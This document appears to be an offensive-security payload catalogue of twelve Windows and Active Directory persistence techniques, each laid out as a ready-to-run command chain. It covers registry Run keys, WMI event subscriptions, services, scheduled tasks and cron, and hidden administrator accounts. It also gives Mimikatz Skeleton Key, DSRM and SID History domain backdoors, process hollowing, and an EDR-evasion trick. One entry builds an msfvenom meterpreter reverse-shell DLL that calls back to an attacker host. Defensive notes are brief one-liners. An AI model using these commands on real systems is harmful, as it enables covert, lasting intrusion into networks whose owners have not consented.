# Persistence

_12 intranet payloads_

### Registry Persistence  `persistence-registry`
_Persistence via the Windows registry_
Subcategory: **Registry** · tags: `persistence` `registry` `windows` `autorun`

**Prerequisites:**
- Access to the target machine already obtained
- Administrator privileges
- Windows system

**Attack chain:**

**Run key persistence**
> Add a Run key for autostart on boot
_platform: windows_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

**RunOnce key**
> RunOnce key, removed after a single execution
_platform: windows_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**Winlogon Helper**
> Modify Userinit for persistence
_platform: windows_
```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f
```

**Service persistence**
> Create a service for persistence
_platform: windows_
```
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
```

**EDR bypass variant:**

**Hidden registry key**
> Use a null byte to hide the registry key
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\x00" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**Analysis:** Registry persistence runs the malicious program at system startup or user logon.

**OPSEC tips:**
- The Run key is the most common persistence method and is easily detected
- Consider a stealthier approach
- Periodically check for anomalous registry entries

**Overview:** The Windows registry offers multiple persistence mechanisms, letting an attacker automatically run malicious code at system startup or user logon.

**Vulnerability principle:** Several registry keys in Windows can automatically execute a program at specific times. This is a designed system feature that can be abused by an attacker.

**Exploitation method:** Exploitation flow: 1) obtain administrator privileges; 2) choose a persistence location; 3) add the path to the malicious program; 4) wait for a system restart or user logon; 5) the malicious program runs automatically.

**Defenses:** Defenses: 1) monitor changes to key registry values; 2) use an allowlist to restrict program execution; 3) periodically audit persistence entries; 4) deploy EDR to detect anomalous behavior.

---

### WMI Persistence  `persistence-wmi`
_Persistence via WMI event subscriptions_
Subcategory: **WMI** · tags: `wmi` `persistence` `windows`

**Prerequisites:**
- Administrator privileges

**Attack chain:**

**Create an event filter**
> Create a WMI event filter
_platform: windows_
```
$filter = New-WmiEventFilter -Name "evil" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

**Create an event consumer**
> Create a command-line consumer
_platform: windows_
```
$consumer = New-WmiEventConsumer -Name "evil" -CommandLineTemplate "powershell -e BASE64_CMD"
```

**Bind filter and consumer**
> Bind them to trigger execution
_platform: windows_
```
New-WmiFilterToConsumerBinding -Filter $filter -Consumer $consumer
```

**Overview:** WMI event subscriptions enable stealthy persistence.

**Vulnerability principle:** WMI allows creating events that execute automatically.

**Exploitation method:** Exploitation flow: 1) create filter 2) create consumer 3) bind to execute

**Defenses:** Defenses: 1) monitor WMI events 2) audit the WMI repository

---

### Startup Folder Persistence  `persistence-startup`
_Persistence via the Startup folder_
Subcategory: **Startup folder** · tags: `startup` `persistence` `windows`

**Prerequisites:**
- Write access

**Attack chain:**

**Current user startup folder**
> Current user startup
_platform: windows_
```
copy evil.lnk "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**All users startup folder**
> All users startup
_platform: windows_
```
copy evil.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**Overview:** Programs placed in the Startup folder run at user logon.

**Vulnerability principle:** The Startup folder is writable.

**Exploitation method:** Exploitation flow: 1) locate the startup folder 2) drop the malicious file 3) wait for user logon

**Defenses:** Defenses: 1) monitor the startup folder 2) restrict write access

---

### Service Persistence  `persistence-service`
_Persistence by creating a service_
Subcategory: **Service** · tags: `service` `persistence` `windows`

**Prerequisites:**
- Administrator privileges

**Attack chain:**

**Create the service**
> Create an autostart service
_platform: windows_
```
sc create evilsvc binPath= "cmd /c powershell -e BASE64_CMD" start= auto
```
**Syntax breakdown:**
- `sc create` — service creation command _command_
- `binPath=` — service execution path _parameter_
- `start= auto` — automatic startup _parameter_

**Start the service**
> Start the service
_platform: windows_
```
sc start evilsvc
```

**Overview:** A service can run automatically at system startup.

**Vulnerability principle:** A service can be configured to execute an arbitrary command.

**Exploitation method:** Exploitation flow: 1) create the service 2) configure autostart 3) trigger via reboot

**Defenses:** Defenses: 1) monitor service creation 2) audit service configuration

---

### DLL Injection Persistence  `persistence-dll-injection`
_Persistence via DLL injection_
Subcategory: **DLL injection** · tags: `dll` `injection` `persistence`

**Prerequisites:**
- Code execution privileges
- A target process

**Attack chain:**

**Create the malicious DLL**
> Generate a malicious DLL
_platform: linux_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**Inject the DLL**
> Inject the DLL into a running process
_platform: windows_
```
Use a tool such as InjectDLL or PowerShell to inject into the target process
```

**AppInit_DLLs**
> Inject via AppInit_DLLs
_platform: windows_
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f
```

**Overview:** DLL injection runs code inside another process.

**Vulnerability principle:** A process can load an arbitrary DLL.

**Exploitation method:** Exploitation flow: 1) create the DLL 2) inject into the target process 3) execute the code

**Defenses:** Defenses: 1) enable CFG 2) monitor DLL loading 3) enforce signature verification

---

### Backdoor User  `persistence-backdoor-user`
_Create a backdoor user account_
Subcategory: **User** · tags: `user` `backdoor` `persistence`

**Prerequisites:**
- Administrator privileges

**Attack chain:**

**Create the user**
> Create an administrator user
_platform: windows_
```
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add
```

**Hide the user**
> Create a hidden user (name ends with $)
_platform: windows_
```
net user backdoor$ P@ssw0rd /add
```

**Hide via registry edit**
> Hide the user via the registry
_platform: windows_
```
reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\backdoor$" /f
```

**Overview:** Creating a backdoor user provides persistent access to the system.

**Vulnerability principle:** An administrator can create users.

**Exploitation method:** Exploitation flow: 1) create the user 2) add to the administrators group 3) hide the user

**Defenses:** Defenses: 1) monitor user creation 2) periodically audit the user list

---

### Hidden User  `persistence-hidden-user`
_Create a hidden administrator user_
Subcategory: **Hidden user** · tags: `hidden` `user` `persistence`

**Prerequisites:**
- SYSTEM privileges

**Attack chain:**

**Create the user**
> Create a user whose name ends with $
_platform: windows_
```
net user hidden$ P@ssw0rd /add
```

**Add to the administrators group**
> Grant administrator privileges
_platform: windows_
```
net localgroup administrators hidden$ /add
```

**Registry-based hiding**
> Fully hide via the registry
_platform: windows_
```
reg export "HKLM\SAM\SAM\Domains\Account\Users\000003E9" user.reg
modify the F value
reg import user.reg
```

**Overview:** A hidden user does not show up on the logon screen or in the user list.

**Vulnerability principle:** The registry can be modified to alter a user's display attributes.

**Exploitation method:** Exploitation flow: 1) create the user 2) modify the registry 3) fully hide it

**Defenses:** Defenses: 1) monitor registry modifications 2) perform deep audits of users

---

### Scheduled Task Persistence  `persistence-scheduled`
_Persistence via scheduled tasks_
Subcategory: **Scheduled task** · tags: `persistence` `scheduled` `task`

**Prerequisites:**
- Permission to create tasks

**Attack chain:**

**Create a logon task**
> Create a task that runs at logon
_platform: windows_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM
```
**Syntax breakdown:**
- `/tn` — task name _parameter_
- `/tr` — program to execute _parameter_
- `/sc onlogon` — trigger condition: at logon _parameter_
- `/ru SYSTEM` — run as user: SYSTEM _parameter_

**Create a timed task**
> Create a task that runs every 5 minutes
_platform: windows_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc minute /mo 5
```

**Create via PowerShell**
> Use PowerShell to create the task
_platform: windows_
```
$action = New-ScheduledTaskAction -Execute "C:\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Backdoor" -User "System"
```

**Linux Cron**
> Linux scheduled task
_platform: linux_
```
crontab -e
add: * * * * * /tmp/backdoor.sh
or: @reboot /tmp/backdoor.sh
```

**Overview:** Scheduled tasks are a common persistence method.

**Vulnerability principle:** A scheduled task can be created to execute an arbitrary program.

**Exploitation method:** Exploitation flow: 1) create the task 2) set the trigger 3) wait for execution

**Defenses:** Defenses: 1) monitor task creation 2) audit task changes 3) restrict creation privileges

---

### Skeleton Key Backdoor  `skeleton-key`
_Implant a master password on a domain controller_
Subcategory: **Domain backdoor** · tags: `skeleton-key` `backdoor` `domain`

**Prerequisites:**
- Domain administrator privileges
- Access to a domain controller

**Attack chain:**

**Implant the Skeleton Key**
> Implant it using Mimikatz
_platform: windows_
```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
**Syntax breakdown:**
- `misc::skeleton` — module that implants the master password _command_

**Use the master password**
> Log in with the master password
_platform: windows_
```
Master password: mimikatz
Any domain user can log in using mimikatz as the password
```

**Detection method**
> Detect the Skeleton Key
_platform: windows_
```
Inspect LSASS memory:
Get-Process lsass
Use EDR to detect memory injection
```

**Overview:** The Skeleton Key implants a master password in memory without affecting the original password.

**Vulnerability principle:** The domain controller's LSASS process can be injected into.

**Exploitation method:** Exploitation flow: 1) obtain domain admin privileges 2) access the DC 3) implant the backdoor

**Defenses:** Defenses: 1) protect the DC 2) monitor LSASS 3) use Credential Guard

---

### DSRM Backdoor  `dsrm-backdoor`
_Establish a backdoor via the DSRM account_
Subcategory: **Domain backdoor** · tags: `dsrm` `backdoor` `domain`

**Prerequisites:**
- Domain administrator privileges
- Access to a domain controller

**Attack chain:**

**Obtain the DSRM password**
> Obtain the DSRM account hash
_platform: windows_
```
mimikatz # lsadump::lsa /patch /name:krbtgt
or
mimikatz # token::elevate
mimikatz # lsadump::sam
```

**Sync the DSRM password**
> Sync the DSRM password with a domain admin's
_platform: windows_
```
ntdsutil
set dsrm password
sync from domain account admin
q
q
```
**Syntax breakdown:**
- `ntdsutil` — AD database tool _command_
- `sync from domain account` — sync the domain account password _keyword_

**Enable the DSRM account**
> Allow the DSRM account to log on remotely
_platform: windows_
```
Modify the registry:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

**Log in with DSRM**
> Use the DSRM account
_platform: windows_
```
Using the DSRM account hash:
mimikatz # sekurlsa::pth /domain:DC_NAME /user:Administrator /ntlm:HASH
or use Pass-the-Hash
```

**Overview:** DSRM is the domain controller's local administrator account and can be used as a backdoor.

**Vulnerability principle:** The DSRM account is independent of domain accounts and is often overlooked.

**Exploitation method:** Exploitation flow: 1) obtain the DSRM hash 2) sync the password 3) enable remote logon

**Defenses:** Defenses: 1) monitor DSRM password changes 2) check the registry 3) audit periodically

---

### SID History Backdoor  `sid-history`
_Establish a backdoor via SID History_
Subcategory: **Domain backdoor** · tags: `sid-history` `backdoor` `domain`

**Prerequisites:**
- Domain administrator privileges

**Attack chain:**

**Add SID History**
> Add SID History
_platform: windows_
```
mimikatz # sid::add /sam:backdoor_user /new:administrator
adds the domain admin SID to a regular user
```
**Syntax breakdown:**
- `sid::add` — add SID History _command_
- `/sam` — target user _parameter_
- `/new` — SID to add _parameter_

**Verify SID History**
> Check SID History
_platform: windows_
```
Get-ADUser backdoor_user -Properties sidHistory
or
whoami /all
```

**Use the backdoor**
> Use the backdoor account
_platform: windows_
```
Log in as backdoor_user
automatically gains domain administrator privileges
```

**Overview:** SID History lets a user inherit another user's privileges.

**Vulnerability principle:** SID History can be abused to add extra privileges.

**Exploitation method:** Exploitation flow: 1) create a regular user 2) add the domain admin SID 3) gain domain admin privileges

**Defenses:** Defenses: 1) monitor SID History 2) audit user attributes 3) use PAM

---

### Process Hollowing Persistence  `persistence-process-hollowing`
_Persistence using process hollowing_
Subcategory: **Process injection** · tags: `process-hollowing` `persistence` `injection`

**Prerequisites:**
- Code execution privileges

**Attack chain:**

**Process hollowing principle**
> Process hollowing principle
_platform: windows_
```
1. Create a legitimate process (in suspended state)
2. Replace the process memory
3. Resume execution
```

**C# implementation**
> C# process hollowing
_platform: windows_
```
using System.Runtime.InteropServices;
// Create the suspended process
CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
// Replace the memory
NtUnmapViewOfSection(...);
VirtualAllocEx(...);
WriteProcessMemory(...);
ResumeThread(...);
```

**Detection method**
> Detect process hollowing
_platform: windows_
```
Inspect process memory:
- Process path does not match the memory content
- Anomalous memory regions
- Use EDR for detection
```

**Overview:** Process hollowing injects malicious code into a legitimate process.

**Vulnerability principle:** The Windows process creation mechanism can be abused.

**Exploitation method:** Exploitation flow: 1) create a suspended process 2) replace the memory 3) resume execution

**Defenses:** Defenses: 1) use EDR 2) monitor process creation 3) scan memory

---
